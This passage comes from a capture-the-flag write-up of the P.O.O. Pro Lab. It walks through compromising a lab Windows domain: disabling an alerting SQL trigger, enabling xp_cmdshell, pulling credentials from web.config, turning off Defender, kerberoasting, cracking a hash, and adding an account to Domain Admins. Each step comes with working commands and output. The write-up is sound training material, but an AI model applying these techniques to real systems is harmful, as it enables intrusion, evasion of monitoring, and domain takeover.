ERROR(COMPATIBILITY\POO_PUBLIC): Line 181: The transaction ended in the trigger. The batch has been aborted.

```

Trying the manual way, I still got the same error.

```bash
SQL (df  dbo@master)> sp_configure 'show advanced options', '1'
INFO(COMPATIBILITY\POO_PUBLIC): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (df  dbo@master)> reconfigure
SQL (df  dbo@master)> sp_configure 'xp_cmdshell', '1'
ERROR(COMPATIBILITY\POO_PUBLIC): Line 11: Attempt to enable xp_cmdshell detected. Database Administrators will be notified!
ERROR(COMPATIBILITY\POO_PUBLIC): Line 181: The transaction ended in the trigger. The batch has been aborted.

```

These triggers serve as a policy designed to alert and prevent attempts to enable and use `xp_cmdshell`. The issue is that, as the `sa` user, I have the ability to [disable these triggers](https://www.mssqltips.com/sqlservertip/2987/can-i-stop-a-system-admin-from-enabling-sql-server-xpcmdshell/). Triggers can be found in `sys.server_triggers` :

```bash
SQL (df  dbo@master)> select name from sys.server_triggers;
name                
-----------------   
ALERT_xp_cmdshell  
```

I just need the [syntax to disable it](https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/#triggerremoval).

```bash
SQL (df  dbo@master)> disable trigger ALERT_xp_cmdshell on all server
SQL (df  dbo@master)> 

```

with that, we can now enable `xp_cmdhsell` and it worked as seen below.

```bash
SQL (df  dbo@master)> enable_xp_cmdshell
INFO(COMPATIBILITY\POO_PUBLIC): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(COMPATIBILITY\POO_PUBLIC): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (df  dbo@master)> xp_cmdshell whoami
output                        
---------------------------   
nt service\mssql$poo_public   

NULL                          

```

## Privilege escalation

`mssql$poo_public` has limited access. While there is a home directory, it is empty. The user has some access to the web directory, but the most notable file, `\inetput\wwwroot\web.config`, returns an access denied error:

```bash
SQL (df  dbo@master)> xp_cmdshell type C:\inetpub\wwwroot\web.config
output              
-----------------   
Access is denied.   

NULL  
```

It appears that when a web server is configured to run the stored procedure `sp_execute_external_script` under a different user account, it allows for certain operations. The syntax for executing the script is [quite straightforward](https://nielsberglund.com/2017/04/20/sql-server-2017---python-executing-inside-sql-server/):

```bash
SQL (df  dbo@master)> EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("whoami");';

INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 
compatibility\poo_public01

Express Edition will continue to be enforced.

```

Now we can run as `poo_public01`. Lets try to read the `web.config` file to see if we can find anything of interest to us.

```bash
SQL (df  dbo@master)> EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("type \inetpub\wwwroot\web.config");';
INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <staticContent>
            <mimeMap
                fileExtension=".DS_Store"
                mimeType="application/octet-stream"
            />
        </staticContent>
        <!--
        <authentication mode="Forms">
            <forms name="login" loginUrl="/admin">
                <credentials passwordFormat = "Clear">
                    <user 
                        name="Administrator" 
                        password="EverybodyWantsToWorkAtP.O.O."
                    />
                </credentials>
            </forms>
        </authentication>
        -->
    </system.webServer>
</configuration>

Express Edition will continue to be enforced.

```

As seen above, the file contains creds for the administrator account. These could work to get past the basic auth at `/admin` and return the next flag.

```bash
┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner]
└─$ curl -s http://administrator:EverybodyWantsToWorkAtP.O.O.@10.13.38.11/admin/
"I can't go back to yesterday, because i was a different person then..."<br>
- Alice in Wonderland<br>
<br>
Flag : POO{[redacted]}

```

# Foothold

## Local Enumeration

It took some time to piece everything together. Initially, I found that the host is listening on WinRM, TCP port 5985, for both IPv4 and IPv6 connections:

```bash
SQL (df  dbo@master)> EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("netstat -ano");';
INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       1004
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       4788
  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:41433          0.0.0.0:0              LISTENING       4540
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       592
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1356
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       720
INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1860
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2508
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       720
  TCP    0.0.0.0:49672          0.0.0.0:0              LISTENING       712
  TCP    10.13.38.11:80         10.10.14.172:32772     TIME_WAIT       0
  TCP    10.13.38.11:80         10.10.14.172:32782     TIME_WAIT       0
  TCP    10.13.38.11:80         10.10.14.172:32794     TIME_WAIT       0
  TCP    10.13.38.11:80         10.10.14.172:32798     TIME_WAIT       0
  TCP    10.13.38.11:80         10.10.14.172:32806     TIME_WAIT       0
  TCP    10.13.38.11:80         10.10.14.172:32822     TIME_WAIT       0
  TCP    10.13.38.11:80         10.10.14.172:32828     TIME_WAIT       0
  TCP    10.13.38.11:80         10.10.14.172:32834     TIME_WAIT       0
..[snip]...
```

Although the initial `nmap` scan did not show the 5985 listening on IPV4, as seen above, we have winrm actively listening. To check further, I was required to get the IPV6 address of the machine using `ipconfig` in order for us to scan it using nmap to see if truly winrm is actively listening on the host.

```bash
SQL (df  dbo@master)> EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("ipconfig");';
INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 

Windows IP Configuration

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::1001
   IPv6 Address. . . . . . . . . . . : dead:beef::7ef0:e82c:6a2:1f2f
   Link-local IPv6 Address . . . . . : fe80::8d5a:640b:98c7:f8de%8
   IPv4 Address. . . . . . . . . . . : 10.13.38.11
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : dead:beef::1
                                       fe80::250:56ff:feb0:8205%8
                                       10.13.38.2

Ethernet adapter Ethernet1 2:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.20.128.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 

Express Edition will continue to be enforced.

```

below is the result of the nmap scan which shows clearly, winrm is listening.

```bash
┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner]
└─$ nmap -sCV -p- -6 dead:beef::1001
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-07 07:27 EAT
Stats: 0:07:57 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 98.54% done; ETC: 07:35 (0:00:07 remaining)
Stats: 0:07:57 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 98.58% done; ETC: 07:35 (0:00:07 remaining)
Nmap scan report for dead:beef::1001
Host is up (0.29s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
| http-server-header: 
|   Microsoft-HTTPAPI/2.0
|_  Microsoft-IIS/10.0
|_http-title: Bad Request
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.2056.00; RTM+
| ms-sql-info: 
|   dead:beef::1001:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM+
|       number: 14.00.2056.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: true
|_    TCP port: 1433
|_ssl-date: 2024-10-07T04:35:50+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-10-06T09:29:44
|_Not valid after:  2054-10-06T09:29:44
| ms-sql-ntlm-info: 
|   dead:beef::1001:1433: 
|     Target_Name: POO
|     NetBIOS_Domain_Name: POO
|     NetBIOS_Computer_Name: COMPATIBILITY
|     DNS_Domain_Name: intranet.poo
|     DNS_Computer_Name: COMPATIBILITY.intranet.poo
|     DNS_Tree_Name: intranet.poo
|_    Product_Version: 10.0.17763
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Bad Request
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 499.29 seconds

```

I can establish a connection over WinRM using Evil-WinRM. To facilitate an IPv6 connection, I’ll add the IP address to my local `/etc/hosts` file. The hostname returned by the box is `COMPATIBILITY`:

```bash
SQL (df  dbo@master)> EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("hostname");';
INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 
COMPATIBILITY

Express Edition will continue to be enforced.

```

as seen below, we have added the IP to our `/etc/hosts/` file on our attacker machine.

```bash
127.0.0.1       localhost
127.0.1.1       v1c70r

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.129.141.23 unika.htb
10.129.3.186 thetoppers.htb
10.129.3.186 s3.thetoppers.htb
dead:beef::1001 COMPATIBILITY

```

Its time to connect to our comprised host as shown below.

```bash
┌──(root㉿v1c70r)-[/home/…/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner]
└─#  evil-winrm -i compatibility -u administrator -p 'EverybodyWantsToWorkAtP.O.O.'

                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

It is time to get our foothold flag.

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/26/2018   5:29 PM             37 flag.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
POO{[REDACTED]}
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 

```

# p00ned

First, I started by enumerating my privilieges with the admin user.

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami /all

USER INFORMATION
----------------

User Name                   SID
=========================== ==========================================
compatibility\administrator S-1-5-21-158512341-328150952-995267585-500

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ===============================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                                          Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled

USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

As seen above, it is clear we are a local admin user of the system. We will now use this hos as our jump point  to other hosts. below is the address of the machine

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   IPv6 Address. . . . . . . . . . . : dead:beef::1001
   IPv6 Address. . . . . . . . . . . : dead:beef::7ef0:e82c:6a2:1f2f
   Link-local IPv6 Address . . . . . : fe80::8d5a:640b:98c7:f8de%8
   IPv4 Address. . . . . . . . . . . : 10.13.38.11
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : dead:beef::1
                                       fe80::250:56ff:feb0:8205%8
                                       10.13.38.2

Ethernet adapter Ethernet1 2:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 172.20.128.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :

```

## Kerberoasting

Next, I decided to perform some kerberoasting in order to get some tickets we could use to get access to another user but first, I had to disable realtime monitoring as shown below.

```bash
*Evil-WinRM* PS C:\users> set-mppreference -disablerealtimemonitoring $true

```

After uploading our powershell script onto the host machine, we shall run it from the sql server as shown below.

```bash
SQL (df  dbo@master)> xp_cmdshell powershell -c import-module C:\Temp\invoke-kerberoast.ps1; invoke-kerberoast 
output                                                                             
--------------------------------------------------------------------------------   
NULL                                                                               

NULL                                                                               

TicketByteHexStream  :                                                             

Hash                 : $krb5tgs$HR_peoplesoft/intranet.poo:1433:A175CE2658B987C0FE5CE7CE9380303E$C82FEE2FB0F43648D7C3BD   
                       10BE84A19E8953E7EE295D224E38F89B6B8EEDBFCF177F1E1DD8BC4CEA78B59059FC365DB3DF096BD8E7FA584BABE6DA   
                       E33C2F3EF1654958DECBF025C651B2CB4016071CE78D505DEE1A9893C1D64215D663324B15F01FEA7CCFB9D3979391E4   
                       D05FDEA0E70575BC8A48FBC1885D9097416F778B07F696203AA818125C0FD2223F721056AE444C1AA10AE3151BAE1757   
                       3A276625C78B2A46DC5F24054541CBD4A7E6FA67082D885F212C2CB132432AD5BD64BDD5063F0AFAC505703703B20B3E   
                       E1E369BDC8281F679B07949474B7C22C498E77ADBB54D9362FBE00AA8678AE180C4713973A08B94DA1A3808EE70B68C6   
                       0D75DC5348DF0BD321FAD17FDA36D7BA4AFD197365958CDE3CEF076EDC90863B1F27CB038D64FEFEE179654C93545A14   
                       AB02CE6E821022D1EFDE08FA58B95D6726724DB02519224E34AAF7C20C165858A28D0EBB4EC1634272CD74610ABDCD11   
                       8898C407FEA9B9B82C539C4FD6465B09C8188A340FE8668E987D4E009D4D8672FD68AD828D3A2F011700B7FEE42C9934   
                       0995A3D6C29442B83ACD453611955E600ACBCEDA6E9FAB078C53954DCC801AD17656CFDDCF0FC7A656FBF67FDE9516CD   
                       3D3E255262841D6C25C52C81472ECE2C16F98CD957996D2C3CA5604F918C58F8EA2D1163D51AF36E9C3DF496442D604B   
                       D31A7D8E3CE1093C47009ADF930A9CF736249D42EE289FBFB9636CD129E8D992C3FFE651CC94046FD1593AD1CD9236F2   
                       DD29E22EE389E56FF702783CA9EE4E7A5BAEC5F647F1EB34E26D98AF57E1C3F84DC83B4C851F5F867FB89CEFCB717679   
                       2AA840F594D946006F5F8C86EB5EB3F1AD50469A769817930A7F4027DFE852B6F235EEC086F88DB38DCF68F889D62388   
                       6683C43C6F52123B6337C16FCF8A23162E21C74A335D5C143292F801DAA42C9469A73F63C245E18A6BCCF779AD82BCA9  
                       EC5D4DC80271D6A8C8494906C55F66AB39DA96AC5C21F271C950940D809CE97E238C4F33486D0B566666F66BD8316602   
                       C5332F749D54A66FFE65CA76302F2D69BD0BD73A5385BE98B006636B44B0B7BA2AA8630B311899875EBE7C97E4DDA210   
                       E35D682924CE1EE1050D5B3E368F45223F329D1140E79DD9670454C07E6EBBF8C5BC7F52E248734F4BBA4B1CA37B4C4C   
                       8CF9F35C937F00C4ACAF923FDF442F8699C0449023F3A15D7B37E2986B5244733BF1199D401EEC5B30E479D0D15C4984   
                       3FCF911C8673464D8FAA70B45129F6D76FD4E4D6056E6063DC40ADA827C4F47622D3A757CC313424DECBF784E51C2A90   
                       9B3F1E131200B4352A3802B20122F0A966C6E5606C723F3E54AC5D53AFD7252D0B115496A0C595A0F1254FCC2CCBB81B  
                       9EE82FDFF47EB993B4D9F4749BC639853727D5A176D55A654A897E05F6FD711E7177EED89D380FC40D1733D47C7D95B0   
                       1511F3920417D651A6D3DF606B01757B634B3876ED3219829922462B8CE47C684AE01C46E3F5023D78881BCA09F67C66   
                       695A5065065CD9A46CB2368B7253568EE429D635829A7C376E22F34DD1E15EEB03D73AD42F41C92F848BEC6CBC422054   
                       C05AB02CC928C7DFF27BE1B34062E0FECA422E1A0721C5672AE2A2A1F566564C61C9DD58D483705913BEA15FFF970A47   
                       13739985CE588246F070D28B81A31AB2707CF8F6B4463DE3C7D5073140F3F6689397   
SamAccountName       : p00_hr                                                      

DistinguishedName    : CN=p00_hr,CN=Users,DC=intranet,DC=poo                       

ServicePrincipalName : HR_peoplesoft/intranet.poo:1433                             

NULL                                                                               

TicketByteHexStream  :                                                             

Hash                 : $krb5tgs$cyber_audit/intranet.poo:443:E3A87FEF289CC540C73A52551F3C3A43$1096E4652145F6AF34174138C   
                       6B5FA7091AC7088CB0AFBA198E5D967C7FF778045E3D7186A75125D963896F3C6A26207ADDDD9E15204182DF89498377  
                       516EC136DE8596791CDF26E1C78F6A94DC993EC61EADDA5B7A71430E16065BB20B6D411FB373349FE6FB012FBA27A7F7   
                       AC52D94F56F06AD072B70448AC78D7D6D17454817BFB1C5684B8A8CC8F5C71DA108618E3B549997E0CF52F5833388B20   
                       06FE0AA2C1191D32DB7F9CC3D742B367F858A87BBBF9C54C8369366B218CAB9B6F63B094BA3FFE3CB4FE6445C2E3835A   
                       DDA544BD6A92604244199F5C73DE0191B3272BF65D4C21B04E6CB4CC0401045FEBB53FE36A2AA05FD4379D868A06AE51   
                       EB177A2958527BCFCB48D8865E9D3192FDED6F1F8832763CEFF1700A666E479A4F043169B9FD1EE9FCAAD741ED2173A9   
                       88D7BCA8A6A9BBAB82931DD8DCE071727BC50330627BEF3B571437006D2DA8E02BC89F4541FEEBBBECF119ACF59EBE7F   
                       BF0C36CD65B36BDFB0D27566A6D9D7E6527D896CE2C3AE84175AD3870943984017E3285C71D379B8AD162A4B4D24A3DF   
                       DFDBC479220B45254F90C3384AE946F5E239480B8C74F93C0889C653F950762AA3CA717D34D6028409975202D55E5DE1   
                       28219423A23C8675F67FC71BEF0534932A2CC7248AECA151F019EA594AFD56B5CF910497AF67DD06AE42AB7FA8DCB7B9  
                       BF519A47B844233238E0B1D085B110B31F055047AD4EA638B25EF4D73F1C0D2CF46CE495D4B2C8C1BBE71C9AD58B958E  
                       71F73339114F893F0C2CDCB33BF7C0C28E1596E0A1EF450B4505EE1AE334CF6AC374E92AF6FB21B13711DAAACC6CACBB  
                       8946F06F5C024EC5150F8402D50F732D93A3625B6A9CEEB7B134DFAC69BE4206C358E3C3B88D0469DC5CDD341BF30C87   
                       C8336EC0A16215EB8F241CB74AD69A30EF118395173D2815CD579E43B2D181242DC85BF26111B221215317C34B82D13D   
                       430F58C8A2B77D8D1D26F3357D2DE6BD5C109E4B16C1D29E507311F5266B7CC323252609D5C9171C04098FFB4E4AB71D  
                       5006CE10BF7329BC0920E328FAB9621A2747587CBA14164CBD31C22CB90DA1CAF0EBDAEC40BD643245A724C62F63DDCD  
                       93C86DF38275E90EE0BD7AC0614A033EAE597BD8131129C091946D983B57401F5AA0FEF76628992129C6C2BA744F2BBA  
                       30477ABFEF70FF620619CBC20B60B9CB238216E33018EC972D6840896C65BACE07DDC87A4EB237108D6AD1E8BA4B13A0  
                       98E16FDA4616A95A5B13334DB5469C8898E7790FACC14EB33671E4BED7935D21ABF80DE28F3F902A96F59470F0C530C9  
                       D3EC61DF1CA62C8B708E7963C7ACB19424814C80C2791735B9CD7DFF5C770412C329C62D8655FDE7293C40F98D38AFCC  
                       10543A7ECF58F6AAC5A0E5B63B3106E124EF76B5062DB4E29732098EFC937347FB0076F3AEF047BC49D188A9BE6F5B38  
                       048AD94733B0FBF0245A337F5408A71FC2772C10B07DB4C85435949617200374F3961AEF56A2D4B929C22CE298EE9587  
                       7159EA68A7F3E596399FB645FFE9D57CA3D49C5E77C8568927A0EFDA0B4E0A04730EB7DB98E9B1F4FD2F93621BAD87B0 
                       7F41F2B09EA07C61AE2154AF9BB2076A2EA1C0857E2990E89103DFC81BB07D5A66541C849A3EFA2C9894CE5BE14CD9C3 
                       0D483FDFFC6CD13BFD35E2730A91396448E9A6BE611C156C5537765A4949FA9CF
SamAccountName       : p00_adm                                                     

DistinguishedName    : CN=p00_adm,CN=Users,DC=intranet,DC=poo                      

ServicePrincipalName : cyber_audit/intranet.poo:443                                

NULL                                                                               

NULL                                                                               

NULL                                                                               

NULL                                                                               

```

As seen above, we have two accounts with their hashes identified. We shall try to crack the hashes using hashcat as seen below.

```bash
 hashcat -m 13100 p00_adm /usr/share/wordlists/seclists/Passwords/Keyboard-Walks/Keyboard-Combinations.txt --force
 --force
...[snip]...
ZQ!5t4r
```

the hash for the admin is the one that was able to crack.  After getting the credentials, we shall use the newly found creds and add the p00_adm to  the admins group as shown below, after uploading the powerview script from [powersploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) onto the host machine.

```bash
*Evil-WinRM* PS C:\Temp> upload PowerView.ps1 .                                        
Info: Uploading /home/n00b/HTB Prolabs/P.O.O/web enum/PowerView.ps1 to C:\Temp\.
                                        
Data: 1027036 bytes of 1027036 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Temp> Import-Module .\PowerView.ps1

// Here I have created a PSCredential object to add p00_adm to the admin groups domain.

*Evil-WinRM* PS C:\Temp> $pass = ConvertTo-SecureString 'ZQ!5t4r' -AsPlainText -Force
*Evil-WinRM* PS C:\Temp> $cred = New-Object System.Management.Automation.PSCredential('intranet.poo\p00_adm', $pass)
*Evil-WinRM* PS C:\Temp> Add-DomainGroupMember -Identity 'Domain Admins' -Members 'p00_adm' -Credential $cred
```

Since p00_adm is now a domain admin, it can access the c$ share on the Domain Controller and grab the flag I found on mr3ks’s desktop.

```bash
*Evil-WinRM* PS C:\Temp> net use \\DC.intranet.poo\c$ /u:intranet.poo\p00_adm 'ZQ!5t4r'
The command completed successfully.

*Evil-WinRM* PS C:\Temp> dir \\DC.intranet.poo\c$\users\

    Directory: \\DC.intranet.poo\c$\users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/15/2018   1:20 AM                Administrator
d-----        3/15/2018  12:38 AM                mr3ks
d-r---       11/21/2016   3:24 AM                Public

*Evil-WinRM* PS C:\Temp> type \\DC.intranet.poo\c$\users\mr3ks\desktop\flag.txt
POO{[REDACTED]}

```